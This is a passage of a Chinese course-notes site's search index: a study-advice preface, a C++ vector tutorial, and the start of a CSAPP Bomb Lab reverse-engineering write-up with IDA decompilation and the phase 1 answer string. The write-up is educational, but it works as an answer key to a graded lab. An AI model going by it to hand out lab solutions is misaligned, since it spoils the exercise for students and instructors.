Assistant"},{"location":"szu_courses/cpp/first/","text":"\u60f3\u5230\u5199\u8fd9\u4e9b\u6587\u7ae0\uff0c\u8fd9\u4e2a\u771f\u7684\u662f\u8bf4\u6765\u8bdd\u957f\u4e86\u554a...\u73b0\u5728\u662f2019\u5e741\u670812\u65e5\uff0c2018\u7ea7\u7684\u540c\u5b66\u4eec\u90fd\u5df2\u7ecf\u4fee\u5b8c\u4e86\u8fd9\u95e8\u8bfe\u7a0b\uff0c\u8be5\u6df7\u8fc7\u53bb\u7684\u4e5f\u90fd\u6df7\u8fc7\u53bb\u4e86\uff0c\u4f46\u5fc3\u91cc\u4ecd\u7136\u662f\u611f\u6168\u4e07\u5343\uff0c\u6700\u540e\u8fd8\u662f\u51b3\u5b9a\u5728\u81ea\u5df1\u8fd9\u4e48\u83dc\u7684\u65f6\u5019\u5199\u51e0\u7bc7\u8fd9\u6837\u7684\u6587\u7ae0\uff0c\u7b97\u662f\u4e00\u70b9\u603b\u7ed3\u5427\uff0c\u6709\u4efb\u4f55\u95ee\u9898\u6b22\u8fce\u8054\u7cfb\u6211\u3002 \u8fd9\u4e2a\u8bfe\u7a0b\u5e94\u8be5\u662f\u5b66\u6821\u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u6280\u672f\u5b66\u751f\u7684\u7b2c\u4e00\u95e8\u4e13\u4e1a\u57fa\u7840\u8bfe\uff0c\u8bfe\u7a0b\u540d\u867d\u7136\u662f\u7a0b\u5e8f\u8bbe\u8ba1\u57fa\u7840\uff0c\u4f46\u5176\u5b9e\u66f4\u591a\u5730\u90fd\u662f\u5728\u8bb2\u6388C\u8bed\u8a00\u7684\u8bed\u8a00\u7279\u6027\uff0c\u5e0c\u671b\u672a\u6765\u8fd9\u95e8\u8bfe\u771f\u7684\u4f1a\u591a\u57f9\u517b\u5b66\u751f\u7684\u7f16\u7a0b\u5174\u8da3\u548c\u7d20\u517b\u5427\u3002 \u6559\u6750\u7528\u5230\u7684\u662f\u56fd\u5185\u7684\u4e00\u672c\u4e2a\u4eba\u89c9\u5f97\u4e0d\u662f\u7279\u522b\u597d\u7684\u4e66\uff0c\u4e66\u4e2d\u6709\u975e\u5e38\u591a\u4e0d\u5408\u6807\u51c6\u7684\u5199\u6cd5\uff0c\u5370\u8c61\u4e2d\u8001\u5e08\u4e5f\u6309\u7167\u4e66\u4e0a\u7684\u5185\u5bb9\u7ed9\u5b66\u751f\u8bb2\u4e86\u8bb8\u591a\u4e8b\u5b9e\u4e0a\u662f \u6807\u51c6\u672a\u5b9a\u4e49\u7684\u884c\u4e3a \u7684\u4e1c\u897f\u3002\u6211\u5728\u9ad8\u4e2d\u9636\u6bb5\u63a5\u89e6\u523051\u5355\u7247\u673a\u5e76\u5c1d\u8bd5\u7740\u81ea\u5b66C\u8bed\u8a00\u7684\u65f6\u5019\u770b\u7684\u4e66\u662f C\u8bed\u8a00\u7a0b\u5e8f\u8bbe\u8ba1\uff1a\u73b0\u4ee3\u65b9\u6cd5 \u3010\u7f8e\u3011K.N.King\u8457 \uff0c\u63a8\u8350\u7ed9\u4f60\u4eec\uff0c\u5f53\u7136\u8fd8\u6709\u50cf C Primer Plus \u4e00\u7c7b\u7684\u7ecf\u5178\u6559\u6750\u4e86\u3002 \u6211\u867d\u7136\u4e0d\u662f\u5bfc\u751f\uff0c\u4f46\u4e5f\u6709\u52a0\u51e0\u4e2a\u5b66\u5f1f\u5b66\u59b9\u7684\u5fae\u4fe1\uff0c\u62c9\u4e86\u5c0f\u7fa4\uff0c\u7ed9\u4e86\u4e00\u4e9b\u5efa\u8bae\uff0c\u5e0c\u671b\u4ed6\u4eec\u5728\u5b66\u4e60\u8fd9\u4e9b\u4e1c\u897f\u7684\u65f6\u5019\u80fd\u5c11\u8d70\u4e00\u4e9b\u5f2f\u8def\u3002\u7136\u800c\u6700\u540e\u53d1\u73b0\u6536\u6548\u751a\u5fae\uff0c\u591a\u6570\u4eba\u5e76\u6ca1\u6709\u529e\u6cd5\u505a\u5230\u5b66\u4e60\u66f4\u591a\u4e0d\u662f\u5728\u8bfe\u672c\u4e0a\u7684\u4e1c\u897f\uff0c\u4f60\u8981\u660e\u767d\u7684\u662f\uff0c\u53ea\u4f1a\u4e66\u4e0a\u7684\u4e1c\u897f\uff0c\u53ea\u4f1a\u8001\u5e08\u6559\u7ed9\u4f60\u7684\u4e1c\u897f\uff0c\u4f60\u6700\u540e\u6bd5\u4e1a\u4f1a\u53d1\u73b0\u81ea\u5df1\u4ec0\u4e48\u4e5f\u505a\u4e0d\u4e86\uff0c\u4ec0\u4e48\u4e5f\u4e0d\u77e5\u9053\u3002\u9996\u5148\uff0c\u4e00\u5b66\u671f\u5c31\u7cbe\u901a\u67d0\u4e9b\u4e1c\u897f\u662f\u51e0\u4e4e\u4e0d\u53ef\u80fd\u7684\u4e8b\u60c5\uff0c\u53e6\u5916\u67d0\u4e9b\u5b66\u751f\u4f01\u56fe\u5728\u671f\u672b\u7684\u51e0\u4e2a\u6216\u8005\u4e00\u4e2a\u665a\u4e0a\u5c31\u5b66\u4f1a\u4ec0\u4e48\uff0c\u8fd9\u53ea\u80fd\u5e2e\u4f60\u6df7\u8fc7\u8003\u8bd5\uff0c\u800c\u4f60\u5e76\u6ca1\u6709\u5b66\u5230\u4ec0\u4e48\u4e1c\u897f\u3002\u5176\u6b21\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u4e0d\u7ba1\u662f\u6df7\u8fc7\u8003\u8bd5\u8fd8\u662f\u597d\u597d\u5b66\u4e60\u901a\u8fc7\u8003\u8bd5\u7684\u5b66\u751f\uff0c\u51e0\u4e4e\u6ca1\u6709\u5728\u8003\u8bd5\u4e4b\u540e\u7ee7\u7eed\u5b66\u4e60\u8fd9\u95e8\u8bfe\u7684\u76f8\u5173\u5185\u5bb9\u7684\uff0c\u5373\u4f7f\u4ed6\u4eec\u771f\u7684\u5bf9\u8fd9\u4e2a\u4e1c\u897f\u611f\u5174\u8da3\uff0c\u6211\u4e2a\u4eba\u7684\u731c\u6d4b\u662f\u9ad8\u4e2d\u9636\u6bb5\u5927\u90e8\u5206\u5b66\u751f\u90fd\u5df2\u7ecf\u517b\u6210\u4e86\u88ab\u8001\u5e08\u704c\u7740\u5b66\u4e60\u7684\u4e60\u60ef\uff0c\u65e9\u5c31\u5fd8\u8bb0\u4e86\u8be5\u600e\u4e48\u81ea\u5df1\u53bb\u5b66\u4e60\u81ea\u5df1\u9700\u8981\u7684\u4e1c\u897f\u3002 \u6211\u89c9\u5f97\u5728\u5b66\u4e60\u7684\u65f6\u5019\u5e94\u8be5\u591a\u601d\u8003\u4e00\u4e0b\uff1a \u6211\u4e3a\u4ec0\u4e48\u8981\u5b66\u8fd9\u4e2a\u4e1c\u897f\uff1f \u6211\u5b66\u8fd9\u4e2a\u4e1c\u897f\u6709\u4ec0\u4e48\u7528\uff1f \u6211\u4e3a\u4ec0\u4e48\u8981\u8fd9\u6837\u5199\uff1f\u8fd9\u6837\u5199\u6709\u4ec0\u4e48\u597d\u5904\uff1f \u6211\u771f\u7684\u7406\u89e3\u8fd9\u4e2a\u4e1c\u897f\u4e86\u5417\uff1f \u6211\u4e0d\u5e0c\u671b\u4f60\u7684\u7b54\u6848\u662f\uff1a\u56e0\u4e3a\u8fd9\u662f\u4e00\u95e8\u5fc5\u4fee\u8bfe\u7a0b\uff1b\u56e0\u4e3a\u53ef\u4ee5\u88c5X\uff0c\u5199\u4ee3\u7801\u7684\u6837\u5b50\u5f88\u9177\uff1b\u8001\u5e08\u8bf4\u8fd9\u6837\u5b50\u5199\u5c31\u53ef\u4ee5\uff0c\u53cd\u6b63\u5927\u5bb6\u90fd\u8fd9\u4e48\u5199\uff0c\u6211\u4e5f\u8ddf\u7740\u5199\u80af\u5b9a\u6ca1\u9519\uff1b\u4f60\u770b\u4e66\u4e0a\u5c31\u662f\u8fd9\u4e48\u5199\u7684\uff01 \u6b64\u5916\uff0c\u517b\u6210\u72ec\u7acb\u601d\u8003\u3001\u89e3\u51b3\u95ee\u9898\u7684\u80fd\u529b\u4e5f\u540c\u6837\u91cd\u8981\u3002\u8981\u8bb0\u5f97\uff0cGoogle is always your good friend\uff0c\u800c\u4e0d\u662f\u5f53\u4e00\u4e2a\u4f38\u624b\u515a\u3002\u73b0\u5728\u4f60\u9047\u5230\u7684\u591a\u6570\u95ee\u9898\u57fa\u672c\u4e0a\u90fd\u80fd\u901a\u8fc7\u641c\u7d22\u6765\u89e3\u51b3\uff0c\u5c1d\u8bd5\u7740\u81ea\u5df1\u89e3\u51b3\u95ee\u9898\u7684\u65f6\u5019\u4f60\u80fd\u603b\u7ed3\u51fa\u4e00\u4e9b\u89e3\u51b3\u65b9\u6cd5\u7684\u5171\u6027\u6216\u8005\u7ecf\u9a8c\u6559\u8bad\uff0c\u800c\u5982\u679c\u4f60\u6ca1\u6709\u517b\u6210\u826f\u597d\u7684\u4e60\u60ef\uff0c\u5230\u4e86\u4ee5\u540e\u6ca1\u6709\u8001\u5e08\u548c\u540c\u5b66\u7684\u65f6\u5019\uff0c\u4f60\u53ef\u80fd\u5f88\u96be\u6216\u8005\u4e0d\u80fd\u5f88\u5feb\u5730\u89e3\u51b3\u4f60\u5f53\u4e0b\u9047\u5230\u7684\u5404\u79cd\u95ee\u9898\u3002","title":"\u524d\u8a00"},{"location":"szu_courses/cpp/vector/","text":"\u8fd9\u5927\u6982\u662f\u8bb0\u5f55\u4e00\u4e0b\u81ea\u5df1\u4f7f\u7528vector\u5bb9\u5668\u7684\u7ecf\u5386\u5427\uff0c\u5e0c\u671b\u53ef\u4ee5\u5bf9\u5927\u5bb6\u6709\u6240\u542f\u53d1\u3002\u5982\u679c\u4f60\u8fd8\u4e0d\u4f1a\u4f7f\u7528vector\u5bb9\u5668\uff0c\u4f60\u53ef\u4ee5\u627e\u5230\u5f88\u591a\u975e\u5e38\u597d\u7684\u8d44\u6e90\uff0c\u4e0d\u7ba1\u662f\u4ece\u4e66\u4e0a\u8fd8\u662f\u4ece\u4e92\u8054\u7f51\u4e0a\u3002 \u6ca1\u6709\u529e\u6cd5\u628a\u6240\u6709\u7684\u65b9\u6cd5\u90fd\u5199\u4e00\u904d\uff0c\u4f60\u53ef\u4ee5\u770b \u53c2\u8003\u624b\u518c \u6216\u5176\u4ed6\u8d44\u6599\u3002\u4e0b\u8ff0\u4ee3\u7801\u5728openSUSE Tumbleweed + JetBrains CLion 2018.3.4 + gcc 8.2.1\u4e0a\u6784\u5efa\u5e76\u6d4b\u8bd5\u8fd0\u884c\u901a\u8fc7\u3002 \u66f4\u65b0\uff1a\u5bf9\u4e0d\u8d77\uff0c\u5fd8\u8bb0\u8bf4\u4e86\uff0c\u9879\u76ee\u6807\u51c6\u662fC++11\uff1a 1 set ( CMAKE_CXX_STANDARD 11 ) \u521a\u5f00\u59cb\u5b66\u4e60\u7684\u65f6\u5019 \u5927\u6982\u662f\u80fd\u52c9\u5f3a\u4f7f\u7528\u4e00\u4e9b\u57fa\u672c\u7684\u6210\u5458\u51fd\u6570\uff0c\u6bd4\u5982\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include <iostream> #include <vector> int main () { std :: vector < int > vector ; vector . push_back ( 0 ); vector . push_back ( 1 ); vector . push_back ( 2 ); vector . push_back ( 3 ); vector . push_back ( 4 ); vector . push_back ( 5 ); std :: cout << vector . front () << * ( vector . begin () + 1 ) << vector [ 2 ] << vector . at ( 3 ) << * ( vector . end () - 2 ) << vector . back () << vector . size () << std :: endl ; return 0 ; } \u6784\u5efa\u5e76\u8fd0\u884c\u53ef\u4ee5\u5f97\u5230\uff1a 1 2 3 4 / home / domain / CLionProjects / untitled_cpp11 / cmake - build - debug / untitled_cpp11 0123456 Process finished with exit code 0 \u8fd8\u6709\u5176\u5b83\u7684\u4e00\u4e9b\u4f8b\u5982\u63d2\u5165\u3001\u5220\u9664\u7b49\u64cd\u4f5c\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #include <iostream> #include <vector> template < typename T > void println ( const std :: vector < T > & vector ) { for ( size_t i = 0 ; i < vector . size (); ++ i ) { std :: cout << vector [ i ] << ' ' ; } std :: cout << std :: endl ; } int main () { std :: vector < int > vector ; vector . push_back ( 0 ); println ( vector ); vector . insert ( vector . begin (), - 1 ); println ( vector ); vector . erase ( vector . end () - 1 ); println ( vector ); vector . clear (); std :: cout << ( vector . empty () ? \"TRUE\" : \"FALSE\" ) << std :: endl ; return 0 ; } \u6784\u5efa\u5e76\u8fd0\u884c\u53ef\u4ee5\u5f97\u5230\uff1a 1 2 3 4 5 6 7 / home / domain / CLionProjects / untitled_cpp11 / cmake - build - debug / untitled_cpp11 0 - 1 0 - 1 TRUE Process finished with exit code 0 \u5b66\u4f1a\u4f7f\u7528\u4e00\u4e9b\u7b97\u6cd5 \u540e\u6765\u662f\u4f1a\u4f7f\u7528\u4e00\u4e9b\u6392\u5e8f\u7b49\u7b97\u6cd5\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include <iostream> #include <vector> #include <algorithm> template < typename T > void println ( const std :: vector < T > & vector ) { for ( size_t i = 0 ; i < vector . size (); ++ i ) { std :: cout << vector [ i ] << ' ' ; } std :: cout << std :: endl ; } int main () { std :: vector < int > vector ; vector . push_back ( 3 ); vector . push_back ( 2 ); vector . push_back ( 1 ); println ( vector ); std :: sort ( vector . begin (), vector . end ()); println ( vector ); std :: reverse ( vector . begin (), vector . end ()); println ( vector ); return 0 ; } \u53ef\u4ee5\u5f97\u5230\uff1a 1 2 3 4 5 6 / home / domain / CLionProjects / untitled_cpp11 / cmake - build - debug / untitled_cpp11 3 2 1 1 2 3 3 2 1 Process finished with exit code 0 \u8fd8\u6709\u5927\u91cf\u7b97\u6cd5\u53ef\u4ee5\u5728 \u8fd9\u91cc \u67e5\u9605\u3002 \u6784\u9020\u51fd\u6570 \u6700\u65e9\u5927\u6982\u662f\u8fd9\u6837\u5b50\u7cca\u5f04\u4e00\u7ef4\u6570\u7ec4\u7684\uff1a 1 2 3 4 5 6 7 8 9 10 11 #include <iostream> #include <vector> int main () { std :: vector < int > vector ; for ( int i = 0 ; i < 5 ; ++ i ) { vector . push_back ( 0 ); } return 0 ; } \u770b\u5230IDE\u7684\u5efa\u8bae\uff0c\u4e8e\u662fAlt+Enter\uff0c\u4e3avector\u9884\u7559\u7a7a\u95f4\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 #include <iostream> #include <vector> int main () { std :: vector < int > vector ; vector . reserve ( 5 ); for ( int i = 0 ; i < 5 ; ++ i ) { vector . push_back ( 0 ); } return 0 ; } \u4f46\u662f\u5230\u540e\u6765\u624d\u77e5\u9053\u5e94\u8be5\u5229\u7528\u6784\u9020\u51fd\u6570\uff1a 1 2 3 4 5 6 7 8 #include <iostream> #include <vector> int main () { std :: vector < int > vector ( 5 , 0 ); return 0 ; } \u5177\u4f53\u53ef\u67e5\u770b \u53c2\u8003 \u3002\u5bf9\uff0c\u5373\u4f7f\u662f\u8fd9\u6837\uff0c\u4e5f\u8fd8\u662f\u6709\u9ed1\u5386\u53f2\uff0c\u6bd4\u5982\u4e8c\u7ef4\u6570\u7ec4\uff1a(\u53cd\u4f8b\u8bf7\u52ff\u6a21\u4eff) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #include <iostream> #include <vector> int main () { std :: vector < std :: vector < int > > vector ; std :: vector < int > vec ; vec . reserve ( 5 ); for ( int ic = 0 ; ic < 5 ; ++ ic ) { vec . push_back ( 0 ); } vector . reserve ( 5 ); for ( int ir = 0 ; ir < 5 ; ++ ir ) { vector . push_back ( vec ); } return 0 ; } \u540e\u6765\u624d\u6162\u6162\u609f\u51fa\u5e94\u8be5\u8fd9\u6837\uff1a 1 2 3 4 5 6 7 8 #include <iostream> #include <vector> int main () { std :: vector < std :: vector < int > > vector ( 5 , std :: vector < int > ( 5 , 0 )); return 0 ; } \u672a\u5b8c\u5f85\u7eed","title":"\u6d45\u8c08vector\u5bb9\u5668"},{"location":"szu_courses/cpp/vector/#_1","text":"\u5927\u6982\u662f\u80fd\u52c9\u5f3a\u4f7f\u7528\u4e00\u4e9b\u57fa\u672c\u7684\u6210\u5458\u51fd\u6570\uff0c\u6bd4\u5982\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include <iostream> #include <vector> int main () { std :: vector < int > vector ; vector . push_back ( 0 ); vector . push_back ( 1 ); vector . push_back ( 2 ); vector . push_back ( 3 ); vector . push_back ( 4 ); vector . push_back ( 5 ); std :: cout << vector . front () << * ( vector . begin () + 1 ) << vector [ 2 ] << vector . at ( 3 ) << * ( vector . end () - 2 ) << vector . back () << vector . size () << std :: endl ; return 0 ; } \u6784\u5efa\u5e76\u8fd0\u884c\u53ef\u4ee5\u5f97\u5230\uff1a 1 2 3 4 / home / domain / CLionProjects / untitled_cpp11 / cmake - build - debug / untitled_cpp11 0123456 Process finished with exit code 0 \u8fd8\u6709\u5176\u5b83\u7684\u4e00\u4e9b\u4f8b\u5982\u63d2\u5165\u3001\u5220\u9664\u7b49\u64cd\u4f5c\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #include <iostream> #include <vector> template < typename T > void println ( const std :: vector < T > & vector ) { for ( size_t i = 0 ; i < vector . size (); ++ i ) { std :: cout << vector [ i ] << ' ' ; } std :: cout << std :: endl ; } int main () { std :: vector < int > vector ; vector . push_back ( 0 ); println ( vector ); vector . insert ( vector . begin (), - 1 ); println ( vector ); vector . erase ( vector . end () - 1 ); println ( vector ); vector . clear (); std :: cout << ( vector . empty () ? \"TRUE\" : \"FALSE\" ) << std :: endl ; return 0 ; } \u6784\u5efa\u5e76\u8fd0\u884c\u53ef\u4ee5\u5f97\u5230\uff1a 1 2 3 4 5 6 7 / home / domain / CLionProjects / untitled_cpp11 / cmake - build - debug / untitled_cpp11 0 - 1 0 - 1 TRUE Process finished with exit code 0","title":"\u521a\u5f00\u59cb\u5b66\u4e60\u7684\u65f6\u5019"},{"location":"szu_courses/cpp/vector/#_2","text":"\u540e\u6765\u662f\u4f1a\u4f7f\u7528\u4e00\u4e9b\u6392\u5e8f\u7b49\u7b97\u6cd5\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include <iostream> #include <vector> #include <algorithm> template < typename T > void println ( const std :: vector < T > & vector ) { for ( size_t i = 0 ; i < vector . size (); ++ i ) { std :: cout << vector [ i ] << ' ' ; } std :: cout << std :: endl ; } int main () { std :: vector < int > vector ; vector . push_back ( 3 ); vector . push_back ( 2 ); vector . push_back ( 1 ); println ( vector ); std :: sort ( vector . begin (), vector . end ()); println ( vector ); std :: reverse ( vector . begin (), vector . end ()); println ( vector ); return 0 ; } \u53ef\u4ee5\u5f97\u5230\uff1a 1 2 3 4 5 6 / home / domain / CLionProjects / untitled_cpp11 / cmake - build - debug / untitled_cpp11 3 2 1 1 2 3 3 2 1 Process finished with exit code 0 \u8fd8\u6709\u5927\u91cf\u7b97\u6cd5\u53ef\u4ee5\u5728 \u8fd9\u91cc \u67e5\u9605\u3002","title":"\u5b66\u4f1a\u4f7f\u7528\u4e00\u4e9b\u7b97\u6cd5"},{"location":"szu_courses/cpp/vector/#_3","text":"\u6700\u65e9\u5927\u6982\u662f\u8fd9\u6837\u5b50\u7cca\u5f04\u4e00\u7ef4\u6570\u7ec4\u7684\uff1a 1 2 3 4 5 6 7 8 9 10 11 #include <iostream> #include <vector> int main () { std :: vector < int > vector ; for ( int i = 0 ; i < 5 ; ++ i ) { vector . push_back ( 0 ); } return 0 ; } \u770b\u5230IDE\u7684\u5efa\u8bae\uff0c\u4e8e\u662fAlt+Enter\uff0c\u4e3avector\u9884\u7559\u7a7a\u95f4\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 #include <iostream> #include <vector> int main () { std :: vector < int > vector ; vector . reserve ( 5 ); for ( int i = 0 ; i < 5 ; ++ i ) { vector . push_back ( 0 ); } return 0 ; } \u4f46\u662f\u5230\u540e\u6765\u624d\u77e5\u9053\u5e94\u8be5\u5229\u7528\u6784\u9020\u51fd\u6570\uff1a 1 2 3 4 5 6 7 8 #include <iostream> #include <vector> int main () { std :: vector < int > vector ( 5 , 0 ); return 0 ; } \u5177\u4f53\u53ef\u67e5\u770b \u53c2\u8003 \u3002\u5bf9\uff0c\u5373\u4f7f\u662f\u8fd9\u6837\uff0c\u4e5f\u8fd8\u662f\u6709\u9ed1\u5386\u53f2\uff0c\u6bd4\u5982\u4e8c\u7ef4\u6570\u7ec4\uff1a(\u53cd\u4f8b\u8bf7\u52ff\u6a21\u4eff) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #include <iostream> #include <vector> int main () { std :: vector < std :: vector < int > > vector ; std :: vector < int > vec ; vec . reserve ( 5 ); for ( int ic = 0 ; ic < 5 ; ++ ic ) { vec . push_back ( 0 ); } vector . reserve ( 5 ); for ( int ir = 0 ; ir < 5 ; ++ ir ) { vector . push_back ( vec ); } return 0 ; } \u540e\u6765\u624d\u6162\u6162\u609f\u51fa\u5e94\u8be5\u8fd9\u6837\uff1a 1 2 3 4 5 6 7 8 #include <iostream> #include <vector> int main () { std :: vector < std :: vector < int > > vector ( 5 , std :: vector < int > ( 5 , 0 )); return 0 ; } \u672a\u5b8c\u5f85\u7eed","title":"\u6784\u9020\u51fd\u6570"},{"location":"szu_courses/csapp/bomb_lab/","text":"\u8fd9\u56de\u6765\u6574\u7406\u4e00\u4e0b\u8fd9\u9898\u9006\u5411\u3002\u6211\u662f\u4e2a\u5b66\u827a\u4e0d\u7cbe\u7684\u9ed8\u9ed8\u65e0\u95fb\u7684\u5bf9\u4e8c\u8fdb\u5236\u4e86\u89e3\u4e0d\u591a\u7684\u666e\u901a\u5b66\u751f\uff0c\u505a\u8fd9\u4e2a\u8fd8\u662f\u6709\u70b9\u96be\u5ea6\u7684\uff0c\u611f\u8c22\u961f\u91cc\u7684\u5927\u4f6c @Apeng \u5e26\u6211\u3002\u4e0b\u9762\u5927\u6982\u662f\u6211\u7684\u89e3\u9898\u8fc7\u7a0b\uff0c\u5982\u679c\u6709\u95ee\u9898\u6216\u662f\u9519\u8bef\uff0c\u8fd8\u671b\u5404\u4f4d\u5927\u4f6c\u6307\u70b9\u3002 \u9898\u76ee\u5b58\u6863\uff1a bomb_64 bomb_64.c \u73af\u5883\uff1aopenSUSE Tumbleweed + wine + IDA + Remote Linux debugger \u56e0\u4e3a\u6211\u662f\u5b9e\u673aLinux\uff0c\u6240\u4ee5\u201cRemote\u201d Linux debugger\u5176\u5b9e\u662f\u5728\u672c\u5730\u8c03\u8bd5\u3002\u5982\u679c\u4f60\u6b63\u5728Windows\u4e0b\u4f7f\u7528IDA\uff0c\u90a3\u4e48\u53ef\u80fd\u9700\u8981Linux\u865a\u62df\u673a\u6765\u8fdb\u884c\u8c03\u8bd5\u3002\u4e0d\u7ba1\u600e\u6837\uff0c\u6709\u53ef\u4ee5\u5b9e\u73b0\u7684\u53ef\u9760\u7684\u65b9\u6cd5\u5c31\u884c\u3002 Warning \u4e0b\u6587\u4e2d\u7531\u6211\u624b\u52a8\u8fd8\u539f\u7684C\u4ee3\u7801\u5e76\u6ca1\u6709\u8fdb\u884c\u6d4b\u8bd5\uff0c\u53ef\u80fd\u5b58\u5728\u95ee\u9898\uff0c\u4ec5\u4f9b\u53c2\u8003\u3002\u5982\u679c\u4f60\u53d1\u73b0\u4e86\u5176\u4e2d\u7684\u95ee\u9898\uff0c\u9ebb\u70e6\u544a\u8bc9\u6211\u3002 main() \u5176\u5b9e\u9898\u76ee\u5df2\u7ecf\u7ed9\u51fa\u4e86 main() \u51fd\u6570\u7684\u76f8\u5173\u5185\u5bb9\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 /* Do all sorts of secret stuff that makes the bomb harder to defuse. */ initialize_bomb (); printf ( \"Welcome to my fiendish little bomb. You have 6 phases with \\n \" ); printf ( \"which to blow yourself up. Have a nice day! \\n \" ); /* Hmm... Six phases must be more secure than one phase! */ input = read_line (); /* Get input */ phase_1 ( input ); /* Run the phase */ phase_defused (); /* Drat! They figured it out! * Let me know how they did it. */ printf ( \"Phase 1 defused. How about the next one? \\n \" ); /* The second phase is harder. No one will ever figure out * how to defuse this... */ input = read_line (); phase_2 ( input ); phase_defused (); printf ( \"That's number 2. Keep going! \\n \" ); /* I guess this is too easy so far. Some more complex code will * confuse people. */ input = read_line (); phase_3 ( input ); phase_defused (); printf ( \"Halfway there! \\n \" ); /* Oh yeah? Well, how good is your math? Try on this saucy problem! */ input = read_line (); phase_4 ( input ); phase_defused (); printf ( \"So you got that one. Try this one. \\n \" ); /* Round and 'round in memory we go, where we stop, the bomb blows! */ input = read_line (); phase_5 ( input ); phase_defused (); printf ( \"Congratulations! You've (mostly) defused the bomb! \\n \" ); printf ( \"Hit Control-C to escape phase 6 (for free!), but if you want to \\n \" ); printf ( \"try phase 6 for extra credit, you can continue. Just beware! \\n \" ); /* Oh, so you want more danger? Let's make this one extra hard. */ input = read_line (); phase_6 ( input ); phase_defused (); /* Wow, they got it! But isn't something... missing? Perhaps * something they overlooked? Mua ha ha ha ha! */ return 0 ; \u770b\u8d77\u6765\u662f\u67096\u4e2a\u5173\u5361\uff0c\u6bcf\u6b21\u90fd\u9700\u8981\u6709\u4e00\u6bb5\u8f93\u5165\uff0c\u5408\u6cd5\u5219\u62c6\u9664\u70b8\u5f39\uff0c\u975e\u6cd5\u5219\u70b8\u5f39\u7206\u70b8\u3002\u867d\u7136\u5df2\u7ecf\u77e5\u9053\u662f\u8fd9\u6837\uff0c\u4f46\u662f\u6211\u8fd8\u662f\u8981F5\u4e00\u4e0b\uff1a \u5148\u5728\u521d\u59cb\u5316 initialize_bomb() \u540e\u9762\u52a0\u4e2a\u65ad\u70b9\uff0c\u7136\u540e\u542f\u52a8\u52a8\u6001\u8c03\u8bd5\u3002 phase_1() F8\u6b65\u8fdb\uff0c\u5728 phase_1() \u51fd\u6570\u524d\u8981\u6c42\u8f93\u5165\uff0c\u6211\u4eec\u5148\u53cc\u51fb phase_1 \u8fdb\u53bb\u770b\u770b\uff1a C, decompiled by IDA 1 2 3 4 5 6 7 8 9 __int64 __fastcall phase_1 ( __int64 a1 ) { __int64 result ; // rax result = strings_not_equal (( _BYTE * ) a1 , \"Science isn't about why, it's about why not?\" ); if ( ( _DWORD ) result ) explode_bomb ( a1 , \"Science isn't about why, it's about why not?\" ); return result ; } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 .text: 0000000000400 E70 ; =============== S U B R O U T I N E ======================================= .text: 0000000000400 E70 .text: 0000000000400 E70 .text: 0000000000400 E70 public phase_1 .text: 0000000000400 E70 phase_1 proc near ; CODE XREF: main+90\u2191p .text: 0000000000400 E70 ; __unwind { .text: 0000000000400 E70 sub rsp , 8 .text: 0000000000400 E74 mov esi , offset aScienceIsnTAbo ; \"Science isn't about why, it's about why\"... .text: 0000000000400 E79 call strings_not_equal .text: 0000000000400 E7E test eax , eax .text: 0000000000400 E80 jz short loc_400E87 .text: 0000000000400 E82 call explode_bomb .text: 0000000000400 E87 ; --------------------------------------------------------------------------- .text: 0000000000400 E87 .text: 0000000000400 E87 loc_400E87 : ; CODE XREF: phase_1+10\u2191j .text: 0000000000400 E87 add rsp , 8 .text: 0000000000400 E8B retn .text: 0000000000400 E8B ; } // starts at 400E70 .text: 0000000000400 E8B phase_1 endp .text: 0000000000400 E8B C, decompiled by me 1 2 3 4 5 void phase_1 ( char str []) { if ( strings_not_equal ( str , \"Science isn't about why, it's about why not?\" )) { explode_bomb (); } } \u975e\u5e38\u660e\u663e\uff0c\u8c03\u7528 strings_not_equal() \u6bd4\u8f83\u5b57\u7b26\u4e32\uff0c\u53cc\u51fb\u8fdb\u5165\u53ef\u770b\u51fa\u8981\u6c42\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u548c\u4e0b\u8ff0\u5b57\u7b26\u4e32 1 Science isn 't about why, it' s about why not ? \u76f8\u7b49\uff0c\u5982\u679c\u4e0d\u76f8\u7b49\u5219\u8c03\u7528 explode_bomb() \u5f15\u7206\u70b8\u5f39\u3002 \u5176\u4e2d\uff0c 1 2 test eax , eax jz short loc_400E87 \u5c06eax\u548ceax\u4e0e\u8fd0\u7b97\u540e\uff0c\u68c0\u67e5\u7ed3\u679c\u662f\u5426\u4e3a0\u3002\u6240\u4ee5\u6548\u679c\u5e94\u8be5\u662feax\u4e3a0\u7684\u65f6\u5019\u8df3\u8f6c\u3002\u4e5f\u53ef\u4ee5\u5199\u6210\uff1a 1 cmp eax , 0 testl eax against eax? The meaning of test is to AND the arguments together, and check the result for zero. So this code tests if EAX is zero or not. je will jump if zero. BTW, this generates a smaller instruction than cmp eax, 0 which is the reason that compilers will generally do it this way. \u5bf9\u4e8e strings_not_equal() \u6765\u8bf4\uff1a C, decompiled by IDA 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 __int64 __fastcall strings_not_equal ( _BYTE * a1 , _BYTE * a2 ) { int v2 ; // er12 int v3 ; // eax unsigned int flag ; // edx __int64 v5 ; // rax char v6 ; // dl v2 = string_length ( a1 ); v3 = string_length ( a2 ); flag = 1 ; if ( v2 == v3 ) { LOBYTE ( flag ) = 0 ; if ( * a1 ) { 